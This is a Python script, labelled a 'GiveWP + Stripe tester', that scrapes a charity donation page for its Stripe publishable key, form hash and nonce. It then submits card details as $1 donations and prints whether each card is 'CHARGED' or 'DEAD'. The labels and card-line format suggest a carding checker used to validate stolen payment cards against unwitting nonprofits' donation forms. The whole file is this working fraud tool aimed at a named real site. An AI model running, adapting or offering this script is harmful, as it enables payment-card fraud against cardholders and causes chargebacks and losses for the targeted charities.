"""
Standalone GiveWP + Stripe tester — no bot needed.
Usage: python3 test_stripe.py
"""
import asyncio, aiohttp, re, json

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# ── CHANGE THESE ─────────────────────────────────────────────────────────────
SITE_URL  = "https://acefonline.org/donate/"
CARD      = "4111111111111111"
MONTH     = "12"
YEAR      = "2028"
CVV       = "123"
# ─────────────────────────────────────────────────────────────────────────────

async def fetch_site(url):
    headers = {"User-Agent": UA}
    async with aiohttp.ClientSession() as s:
        async with s.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=20)) as r:
            return await r.text()

def parse_givewp_stripe(html):
    info = {}

    # publishable key — from give_stripe_vars JSON block
    m = re.search(r'give_stripe_vars\s*=\s*({.*?})\s*;', html, re.DOTALL)
    if m:
        try:
            d = json.loads(m.group(1))
            info['pk'] = d.get('publishable_key', '')
        except Exception:
            pass

    # fallback: data-publishable-key attribute
    if not info.get('pk'):
        m = re.search(r'data-publishable-key=["\']([^"\']+)["\']', html)
        if m:
            info['pk'] = m.group(1)

    # form_id
    m = re.search(r'["\']give-form-id["\']\s*value=["\'](\d+)["\']', html)
    if not m:
        m = re.search(r'name=["\']give-form-id["\']\s*value=["\'](\d+)["\']', html)
    if not m:
        m = re.search(r'data-id=["\'](\d+)["\']', html)
    if m:
        info['form_id'] = m.group(1)

    # form_hash
    m = re.search(r'["\']give-form-hash["\']\s*value=["\']([^"\']+)["\']', html)
    if not m:
        m = re.search(r'name=["\']give-form-hash["\']\s*value=["\']([^"\']+)["\']', html)
    if m:
        info['form_hash'] = m.group(1)

    # nonce
    m = re.search(r'["\']give-payment-mode-nonce["\']\s*value=["\']([^"\']+)["\']', html)
    if not m:
        m = re.search(r'name=["\']give-payment-mode-nonce["\']\s*value=["\']([^"\']+)["\']', html)
    if m:
        info['nonce'] = m.group(1)

    # ajax_url
    m = re.search(r'"ajaxurl"\s*:\s*"([^"]+)"', html)
    if not m:
        m = re.search(r'ajaxurl\s*=\s*["\']([^"\']+)["\']', html)
    if m:
        info['ajax_url'] = m.group(1).replace('\\/', '/')
    else:
        from urllib.parse import urlparse
        p = urlparse(SITE_URL)
        info['ajax_url'] = f"{p.scheme}://{p.netloc}/wp-admin/admin-ajax.php"

    return info

async def create_payment_method(pk, card, month, year, cvv, site_origin=""):
    url = "https://api.stripe.com/v1/payment_methods"
    headers = {
        "Authorization": f"Bearer {pk}",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Origin": site_origin,
        "Referer": site_origin + "/",
        "Stripe-Version": "2023-10-16",
    }
    data = {
        "type": "card",
        "card[number]": card,
        "card[exp_month]": month,
        "card[exp_year]": year,
        "card[cvc]": cvv,
        "billing_details[name]": "John Doe",
    }
    async with aiohttp.ClientSession() as s:
        async with s.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=20)) as r:
            resp = await r.json()
            print(f"\n[STRIPE] Status: {r.status}")
            print(json.dumps(resp, indent=2))
            return resp

async def submit_donation(info, pm_id):
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": SITE_URL,
        "Origin": SITE_URL.rstrip('/').rsplit('/', 1)[0] if '/' in SITE_URL else SITE_URL,
    }
    data = {
        "action": "give_process_donation",
        "give-form-id": info.get('form_id', ''),
        "give-form-hash": info.get('form_hash', ''),
        "give-payment-mode-nonce": info.get('nonce', ''),
        "give_payment_mode": "stripe_checkout",
        "give_stripe_payment_method": pm_id,
        "give-amount": "1.00",
        "give_first": "John",
        "give_last": "Doe",
        "give_email": "john@example.com",
        "give-recurring-period": "once",
        "give-price-id": "custom",
    }
    async with aiohttp.ClientSession() as s:
        async with s.post(info['ajax_url'], headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=30)) as r:
            text = await r.text()
            print(f"\n[GIVEWP] Status: {r.status}")
            print(text[:2000])
            try:
                return json.loads(text)
            except Exception:
                return {"raw": text}

async def main():
    print(f"Site : {SITE_URL}")
    print(f"Card : {CARD}|{MONTH}|{YEAR}|{CVV}")
    print("=" * 60)

    print("\n[1/3] Fetching site data...")
    html = await fetch_site(SITE_URL)
    info = parse_givewp_stripe(html)
    print(f"  pk        : {info.get('pk', 'NOT FOUND')}")
    print(f"  form_id   : {info.get('form_id', 'NOT FOUND')}")
    print(f"  form_hash : {info.get('form_hash', 'NOT FOUND')}")
    print(f"  nonce     : {info.get('nonce', 'NOT FOUND')}")
    print(f"  ajax_url  : {info.get('ajax_url', 'NOT FOUND')}")

    if not info.get('pk'):
        print("\n[!] No publishable key found. Site may not use GiveWP+Stripe.")
        return

    from urllib.parse import urlparse
    origin = urlparse(SITE_URL).scheme + "://" + urlparse(SITE_URL).netloc

    print("\n[2/3] Creating Stripe PaymentMethod...")
    pm_resp = await create_payment_method(info['pk'], CARD, MONTH, YEAR, CVV, origin)

    if 'error' in pm_resp:
        print(f"\nResult: DEAD — {pm_resp['error'].get('message', 'unknown')}")
        return

    pm_id = pm_resp.get('id', '')
    print(f"\n  PaymentMethod ID: {pm_id}")

    print("\n[3/3] Submitting donation to GiveWP...")
    result = await submit_donation(info, pm_id)

    print("\n" + "=" * 60)
    if isinstance(result, dict) and result.get('success'):
        print("Result: CHARGED ✓")
    elif isinstance(result, dict) and not result.get('success'):
        msg = result.get('data', {})
        if isinstance(msg, dict):
            msg = msg.get('message', str(msg))
        print(f"Result: {msg}")
    else:
        print("Result: Check raw response above")

asyncio.run(main())
